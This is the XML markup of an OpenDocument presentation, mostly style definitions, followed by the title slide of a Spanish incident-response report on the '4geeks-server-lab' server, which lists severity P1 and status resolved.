      <style:graphic-properties draw:fill="none" draw:stroke="non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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a2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666666"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565">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="non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2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95">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a254">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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82">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fdecea" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#f1948a" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic"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87">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e8f8f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.00694in" svg:stroke-color="#82e0aa" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a888">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#27ae60"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5b7a8a"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c0392b"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e67e22" style:text-line-through-type="none" style:text-line-through-style="none" style:text-line-through-width="auto" style:text-line-through-color="font-color" style:text-position="0% 100%" fo:font-family="Courier New" style:font-family-asian="Courier New" style:font-family-complex="Courier New"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7">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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none" draw:stroke="dash" draw:stroke-dash="a259" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a261">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2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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a26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draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%"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9">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84">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a585" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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73">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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79">
      <style:graphic-properties draw:fill="none" draw:stroke="dash" draw:stroke-dash="a278" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a590">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94">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>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92">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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98">
      <style:graphic-properties draw:fill="none" draw:stroke="dash" draw:stroke-dash="a297" svg:stroke-width="0.02083in" svg:stroke-color="#00a896" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a299">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#02809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0">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#27ae60" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1501">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05">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e0f5f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#b2dfe4" svg:stroke-opacity="100%" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1506">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e0f5f5" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01667in" svg:stroke-color="#028090" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1507" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1508">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6">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1201" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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2">
      <style:drawing-page-properties draw:fill="solid" draw:fill-color="#1b3a4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23">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#02c39a" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1524">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#02c39a" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1525">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01667in" svg:stroke-color="#028090" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a1526" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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210">
      <style:table-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:family="table-column" style:name="a1211">
      <style:table-column-properties style:column-width="1.5in"/>
    </style:style>
    <style:style style:family="table-column" style:name="a1212">
      <style:table-column-properties style:column-width="2.6in"/>
    </style:style>
    <style:style style:family="table-column" style:name="a1213">
      <style:table-column-properties style:column-width="3.9in"/>
    </style:style>
    <style:style style:family="table-column" style:name="a1214">
      <style:table-column-properties style:column-width="1.36in"/>
    </style:style>
    <style:style style:family="table-row" style:name="a1215">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a1216">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fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:family="text" style:name="a1217">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1218">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1219">
      <style:table-cell-properties style:vertical-align="top" fo:background-color="#1b3a4b"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15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1">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535">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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0">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fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:family="text" style:name="a1221">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1222">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1223">
      <style:table-cell-properties style:vertical-align="top" fo:background-color="#1b3a4b"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224">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fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:family="text" style:name="a1225">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="drawing-page" style:name="a66">
      <style:drawing-page-properties draw:fill="solid" draw:fill-color="#1b3a4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26">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a67">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#02c39a" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1227">
      <style:table-cell-properties style:vertical-align="top" fo:background-color="#1b3a4b"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68">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#02c39a" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1228">
      <style:text-properties fo:color="#ffffff"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fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:family="graphic" style:name="a69">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.02083in" svg:stroke-color="#028090" svg:stroke-opacity="100%"/>
    </style:style>
    <style:style style:family="text" style:name="a1229">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="presentation" style:name="a1540">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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paragraph" style:name="a1230">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a71">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#02c39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31">
      <style:table-cell-properties style:vertical-align="top" fo:background-color="#1b3a4b"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32">
      <style:table-row-properties style:row-height="0.35in"/>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4">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>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6">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8">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a79">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a71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0">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2">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a400">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83">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1243">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a401">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a84">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44">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02" style:parent-style-name="Graphics">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403">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c0392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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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7">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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48">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49">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="text" style:name="a407">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a92">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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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3">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411">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5">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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6">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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7">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15">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16">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9">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a417">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="graphic" style:name="a418" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a419">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c0392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3">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#000000" draw:opacity="100%" draw:stroke="non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parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="non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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1261">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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4">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="text" style:name="a423">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65">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66">
      <style:table-row-properties style:row-height="0.35in"/>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68">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a427">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margin-left="0in" fo:text-indent="0in"/>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a8d8de"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44">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#028090" draw:opacity="100%" draw:stroke="non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49" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1270">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text" style:name="a1271">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72">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a431">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paragraph" style:name="a1273">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a432">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table-cell" style:name="a1274">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33">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1275">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34" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1276">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a435">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#c0392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margin-left="0in" fo:text-indent="0in"/>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8">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4" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none"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d1d2d3"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1a1d21"/>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58">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graphic" style:name="a759">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#c0392b" draw:opacity="100%" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1280">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="paragraph" style:name="a1281">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in"/>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2">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83">
      <style:table-row-properties style:row-height="0.35in"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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443">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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>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7">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8">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graphic" style:name="a447">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#ffffff" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#b2dfe4" svg:stroke-opacity="100%" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>
    </style:style>
    <style:style style:family="text" style:name="a1289">
      <style:text-properties fo:font-family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:family="graphic" style:name="a448">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#fafafa" draw:opacity="100%" draw:stroke="solid" svg:stroke-width="0.01111in" svg:stroke-color="#b2dfe4" svg:stroke-opacity="100%" draw:shadow="visible" draw:shadow-offset-x="0.02946in" draw:shadow-offset-y="0.02946in" draw:shadow-color="#1b3a4b" draw:shadow-opacity="13%"/>
    </style:style>
    <style:style style:family="graphic" style:name="a449">
      <style:graphic-properties draw:fill="solid" draw:fill-color="#e67e22" draw:opacity="100%" draw:stroke="non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3">
      <style:graphic-properties draw:fill="none" draw:stroke="solid" svg:stroke-width="0.01389in" svg:stroke-color="#000000" svg:stroke-opacity="100%"/>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9">
      <style:drawing-page-properties draw:fill="solid" draw:fill-color="#f4faf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64" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a76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5b7a8a"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margin-left="0in" fo:text-indent="0in"/>
    </style:style>
    <style:style style:family="table-cell" style:name="a1291">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50" style:parent-style-name="Graphics">
      <style:graphic-properties draw:fill="none" draw:stroke="none"/>
    </style:style>
    <style:style style:family="text" style:name="a1292">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451">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e67e22"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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>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5">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6">
      <style:text-properties fo:color="#0000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anguage="en" fo:country="US"/>
    </style:style>
    <style:style style:family="text" style:name="a455">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1b3a4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family="Calibri" style:font-family-asian="Calibri" style:font-family-complex="Calibri" fo:font-size="0.125in" style:font-size-asian="0.125in" style:font-size-complex="0.125in" fo:language="en" fo:country="US"/>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margin-left="0in" fo:text-indent="0in"/>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9">
      <style:table-cell-properties style:vertical-align="top" fo:border-top="0.00694in solid #b2dfe4" fo:border-bottom="0.00694in solid #b2dfe4" fo:border-left="0.00694in solid #b2dfe4" fo:border-right="0.00694in solid #b2dfe4" fo:padding-top="0.05in" fo:padding-bottom="0.05in" fo:padding-left="0.1in" fo:padding-right="0.1in"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:family="graphic" style:name="a4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office:automatic-styles>
  <office:body>
    <office:presentation>
      <draw:page draw:name="Slide 1" draw:style-name="a66" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-256">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="0.1in" draw:id="id6" draw:style-name="a67" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0in" svg:y="5.525in" svg:width="10in" svg:height="0.1in" draw:id="id7" draw:style-name="a68" draw:name="Shape 1">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.6in" svg:y="0.45833in" svg:width="8.8in" svg:height="4.50833in" draw:id="id8" draw:style-name="a69" draw:name="Shape 2">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id9" draw:style-name="a70" draw:name="Image 0" svg:x="4.25in" svg:y="1.05in" svg:width="1.5in" svg:height="1.5in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image1.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1in" svg:y="2.62in" svg:width="8in" svg:height="0.38in" draw:id="id10" draw:style-name="a74" draw:name="Text 3">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a73" text:class-names="" text:cond-style-name=""><text:span text:style-name="a71" text:class-names="">INFORME DE SEGURIDAD</text:span><text:span text:style-name="a72" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1in" svg:y="3in" svg:width="8in" svg:height="0.6in" draw:id="id11" draw:style-name="a78" draw:name="Text 4">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a77" text:class-names="" text:cond-style-name=""><text:span text:style-name="a75" text:class-names="">Respuesta a Incidente de Ciberseguridad</text:span><text:span text:style-name="a76" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="1in" svg:y="3.6in" svg:width="8in" svg:height="0.32in" draw:id="id12" draw:style-name="a82" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a81" text:class-names="" text:cond-style-name=""><text:span text:style-name="a79" text:class-names="">4geeks-server-lab <text:s text:c="1"/>— <text:s text:c="1"/>Análisis, Remediación y Fortalecimiento</text:span><text:span text:style-name="a80" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0in" svg:y="4.95in" svg:width="10in" svg:height="0.58in" draw:id="id13" draw:style-name="a83" draw:name="Shape 6">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.2in" svg:y="4.97in" svg:width="1.85in" svg:height="0.2in" draw:id="id14" draw:style-name="a87" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a86" text:class-names="" text:cond-style-name=""><text:span text:style-name="a84" text:class-names="">SERVIDOR</text:span><text:span text:style-name="a85" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.2in" svg:y="5.17in" svg:width="1.85in" svg:height="0.28in" draw:id="id15" draw:style-name="a91" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a90" text:class-names="" text:cond-style-name=""><text:span text:style-name="a88" text:class-names="">4geeks-server-lab</text:span><text:span text:style-name="a89" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.16in" svg:y="4.97in" svg:width="1.85in" svg:height="0.2in" draw:id="id16" draw:style-name="a95" draw:name="Text 9">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a94" text:class-names="" text:cond-style-name=""><text:span text:style-name="a92" text:class-names="">SEVERIDAD</text:span><text:span text:style-name="a93" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.16in" svg:y="5.17in" svg:width="1.85in" svg:height="0.28in" draw:id="id17" draw:style-name="a99" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a98" text:class-names="" text:cond-style-name=""><text:span text:style-name="a96" text:class-names="">Alta (P1)</text:span><text:span text:style-name="a97" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.12in" svg:y="4.97in" svg:width="1.85in" svg:height="0.2in" draw:id="id18" draw:style-name="a103" draw:name="Text 11">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a102" text:class-names="" text:cond-style-name=""><text:span text:style-name="a100" text:class-names="">ESTADO</text:span><text:span text:style-name="a101" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="4.12in" svg:y="5.17in" svg:width="1.85in" svg:height="0.28in" draw:id="id19" draw:style-name="a107" draw:name="Text 12">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a106" text:class-names="" text:cond-style-name=""><text:span text:style-name="a104" text:class-names="">Resuelto</text:span><text:span text:style-name="a105" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.08in" svg:y="4.97in" svg:width="1.85in" svg:height="0.2in" draw:id="id20" draw:style-name="a111" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a110" text:class-names="" text:cond-style-name=""><text:span text:style-name="a108" text:class-names="">ANÁLISIS</text:span><text:span text:style-name="a109" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="6.08in" svg:y="5.17in" svg:width="1.85in" svg:height="0.28in" draw:id="id21" draw:style-name="a115" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a114" text:class-names="" text:cond-style-name=""><text:span text:style-name="a112" text:class-names="">09 Jun 2025</text:span><text:span text:style-name="a113" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="8.04in" svg:y="4.97in" svg:width="1.85in" svg:height="0.2in" draw:id="id22" draw:style-name="a119" draw:name="Text 15">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a118" text:class-names="" text:cond-style-name=""><text:span text:style-name="a116" text:class-names="">REMEDIACIÓN</text:span><text:span text:style-name="a117" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="8.04in" svg:y="5.17in" svg:width="1.85in" svg:height="0.28in" draw:id="id23" draw:style-name="a123" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
